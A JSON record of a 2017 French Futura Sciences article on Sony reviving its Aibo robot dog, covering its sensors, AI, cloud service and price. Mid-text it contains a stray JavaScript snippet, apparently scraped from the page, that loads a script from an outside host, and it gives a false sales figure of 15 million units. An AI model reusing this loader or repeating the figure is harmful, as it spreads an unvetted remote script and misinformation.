{"title": "Aibo, le robot chien de Sony, est de retour", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "02/11/2017", "content": "Dix ans après la fin de la commercialisation du premier modèle, Sony vient de dévoiler une nouvelle version de son robot chien Aibo. Truffé de capteurs et dopé à l'intelligence artificielle, il s'emploiera à créer un «  lien émotionnel  » avec les membres de la famille. Lors de sa sortie en 1999,  Aibo , le robot  chien  de Sony, est rapidement devenu la  coqueluche  des amateurs de gadgets, notamment des Japonais, très friands de  robotique . Pourtant onéreux (environ 1.800 euros), Aibo a été écoulé à 15 millions d'exemplaires dans le monde jusqu'à l'arrêt de sa commercialisation en 2006. Sony ayant fermé le service après-vente de son  robot  chien en 2014, de nombreux propriétaires nippons, très attachés à celui qu'ils considéraient comme un véritable compagnon, ont même participé à un  service funéraire pour les Aibo . Bonne nouvelle pour ces malheureux : Sony a finalement décidé de ressusciter  Aibo . La firme japonaise vient de présenter une nouvelle version de son  robot chien  qui sortira début 2018. Son design est beaucoup plus abouti que pour le premier modèle, avec notamment deux écrans Oled en guise d' yeux  qui lui permettent de véhiculer des expressions.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Tous les Aibo seront connectés au cloud Techniquement, cet Aibo 2 est beaucoup plus sophistiqué que son prédécesseur. Ses  articulations  lui assurent 22 degrés de liberté au niveau de la tête, la bouche, le cou, les pattes, les oreilles et la queue. Le  robot  embarque toute une série de  capteurs  ( mouvements , distance,  luminosité , pression,  gyroscope ) répartis sur le  dos , la mâchoire, la tête, le postérieur, mais aussi des microphones, un haut-parleur et deux caméras  fish-eye  pour cartographier son environnement. Aibo sait reconnaître ses maîtres, peut les comprendre lorsqu'ils lui parlent et réagir aux caresses. Il peut fonctionner pendant deux heures avant de devoir être rechargé. Sony fait également appel à l' intelligence artificielle  et à l'apprentissage profond pour faire évoluer le comportement du robot au fil de ses interactions. Par ailleurs, le  robot chien  est connecté à une plateforme de  cloud computing  qui collectera les données de tous les Aibo en service afin de créer une base de connaissance commune censée améliorer leur intelligence. Dans un premier temps, Aibo sera vendu au Japon à partir du 11 janvier au tarif de 198.000 yens (environ 1.500 euros au cours actuel) plus un abonnement au service cloud de 22 euros par mois. Spot, le robot quadrupède de Boston Dynamics                       Découvrez Spot, l'un des robots de Boston Dynamics. Ce prototype qui ressemble à un gros chien se déplace avec une étonnante agilité et garde même l'équilibre après un coup de pied, la preuve en vidéo !                                       ", "theme": "tech"}